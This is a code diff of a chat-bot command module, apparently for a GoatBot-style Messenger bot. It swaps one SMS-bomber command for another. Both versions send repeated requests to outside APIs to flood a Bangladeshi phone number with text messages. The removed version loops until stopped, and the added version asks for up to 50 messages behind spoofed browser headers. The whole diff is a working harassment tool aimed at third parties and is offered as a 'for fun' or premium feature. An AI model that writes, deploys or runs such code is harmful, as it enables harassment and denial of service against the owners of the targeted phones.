@@ -1,100 +1,108 @@
-const axios = require("axios");
-const bombingFlags = {};
-const deltaNext = 5;
-
-function expToLevel(exp) {
- return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
-}
+const axios = require('axios');
 
 module.exports = {
- config: {
- name: "sms",
- version: "2.2",
- author: "Chitron Bhattacharjee",
- countDown: 0,
- role: 0,
- shortDescription: {
- en: "Send SMS bomb"
- },
- description: {
- en: "Starts SMS bombing on a number for fun (cost: 100 coins)"
- },
- category: "tools",
- guide: {
- en: "sms 01xxxxxxxxx or sms off"
- }
- },
+  config: {
+    name: "bomber",
+    aliases: ["bombing", "smsbomb"],
+    version: "1.7",
+    author: "Zihad Ahmed",
+    countDown: 5,
+    role: 0,
+    isPremium: true,
+    shortDescription: "SMS Bomber Tool",
+    longDescription: "Sends SMS using xihad-4-x public API (Note: count may be ignored by API)",
+    category: "🔥 | Premium",
+    guide: {
+      en: "{pn} <number> - <count>\nExample: {pn} 018xxxxxxxx - 5"
+    }
+  },
 
- onChat: async function ({ event, message, args, usersData }) {
- const threadID = event.threadID;
- const senderID = event.senderID;
- const input = args.join(" ").trim();
+  onStart: async function ({ message, args, api }) {
+    if (args.length < 1) {
+      return message.reply("Usage: -bomber <number> - <count>\nExample: -bomber 018xxxxxxxx - 1");
+    }
 
- if (!input.toLowerCase().startsWith("sms")) return;
+    const input = args.join(" ");
+    const [numberPart, countPart] = input.split("-").map(part => part.trim());
+    let number = numberPart ? numberPart.replace(/\s+/g, '') : null;
+    let count = countPart ? parseInt(countPart) : 1;
 
- const number = input.split(" ")[1];
+    if (!number || isNaN(count) || count < 1) {
+      return message.reply("Invalid format! Example: -bomber 018xxxxxxxx - 10");
+    }
 
- // 🧠 Get user info
- const userData = await usersData.get(senderID);
- const exp = userData.exp || 0;
- const balance = userData.money || 0;
- const level = expToLevel(exp);
+    // Clean number further (BD format check)
+    if (number.startsWith("880") && number.length === 13) {
+      number = "01" + number.slice(3);
+    } else if (!number.startsWith("01") || number.length !== 11) {
+      return message.reply("Only Bangladeshi numbers supported (must start with 01 and be 11 digits)");
+    }
 
- // ⛔ Level check
- if (level < 2) {
- return message.reply("🚫 এই কমান্ড ব্যবহার করতে আপনার লেভেল কমপক্ষে 2 হতে হবে!");
- }
+    // Limit count to prevent overload
+    count = Math.min(count, 50);
 
- // 📴 Stop bombing
- if (number === "off") {
- if (bombingFlags[threadID]) {
- bombingFlags[threadID] = false;
- return message.reply("✅ SMS বোম্বিং বন্ধ করা হয়েছে।");
- } else {
- return message.reply("❗এই থ্রেডে কোনো বোম্বিং চলছিল না।");
- }
- }
+    // New API URL
+    const apiUrl = `https://xihad-4-x.vercel.app/Tools/Bomber?number=${number}&count=${count}&apikey=hi`;
 
- // ❌ Invalid number
- if (!/^01[0-9]{9}$/.test(number)) {
- return message.reply(
- "📱 একটি সঠিক বাংলাদেশি নম্বর দিন!\n" +
- "👉 উদাহরণ: sms 01xxxxxxxxx\n\n" +
- "💸 প্রতি বোম্বিং-এ ১০০ coin কাটা হবে!"
- );
- }
+    let processingMsg;
+    try {
+      processingMsg = await message.reply(
+        `⏳ Starting SMS bombing...\n\nTarget: ${number}\nRequested: ${count}`
+      );
 
- // 🔁 Already bombing
- if (bombingFlags[threadID]) {
- return message.reply("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে লিখুন: sms off");
- }
+      const response = await axios.get(apiUrl, {
+        timeout: 25000,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+          'Accept': 'application/json, text/plain, */*',
+          'Referer': 'https://www.google.com/'
+        }
+      });
 
- // 💸 Balance check
- if (balance < 100) {
- return message.reply(`❌ আপনার কাছে যথেষ্ট coin নেই!\n🔻 দরকার: 100 coin\n🪙 বর্তমান coin: ${balance}`);
- }
+      // Unsend loading message (GoatBot style)
+      if (processingMsg && processingMsg.messageID) {
+        try {
+          await api.unsendMessage(processingMsg.messageID);
+        } catch (unsendError) {
+          console.error("Unsend failed:", unsendError.message);
+        }
+      }
 
- // ✅ Deduct 100 coin
- await usersData.set(senderID, {
- money: balance - 100
- });
+      // Check response (adapt based on actual API output; assuming it has 'status' or 'success')
+      if (response.status === 200 && (response.data?.status === true || response.data?.success)) {
+        await message.reply(
+          `✅ Bombing started!\n\n` +
+          `Target: ${number}\n` +
+          `Requested count: ${count}\n` +
+          `API message: ${response.data.message || response.data.result || 'Attack initiated'}\n` +
+          `Note: Some APIs ignore count and send fixed amount (~100 SMS)`
+        );
+      } else {
+        await message.reply(
+          `❌ API issue (Status: ${response.status})\n` +
+          `Details: ${JSON.stringify(response.data || 'No details from API')}`
+        );
+      }
 
- message.reply(`💥 SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\n💸 ১০০ coin কেটে নেওয়া হয়েছে!\n🛑 বন্ধ করতে লিখুন: sms off`);
+    } catch (error) {
+      // Try to unsend loading even on error
+      if (processingMsg && processingMsg.messageID) {
+        try {
+          await api.unsendMessage(processingMsg.messageID);
+        } catch {}
+      }
 
- bombingFlags[threadID] = true;
+      let errorMsg = "❌ Failed!\n";
+      if (error.response) {
+        errorMsg += `Status: ${error.response.status}\nDetails: ${JSON.stringify(error.response.data || 'No info')}`;
+      } else if (error.code === 'ECONNABORTED') {
+        errorMsg += "Timeout - API might be slow or down";
+      } else {
+        errorMsg += error.message;
+      }
 
- (async function startBombing() {
- while (bombingFlags[threadID]) {
- try {
- await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
- } catch (err) {
- message.reply(`❌ ত্রুটি: ${err.message}`);
- bombingFlags[threadID] = false;
- break;
- }
- }
- })();
- },
-
- onStart: async function () {}
+      await message.reply(errorMsg);
+      console.error("Bomber Error:", error);
+    }
+  }
 };
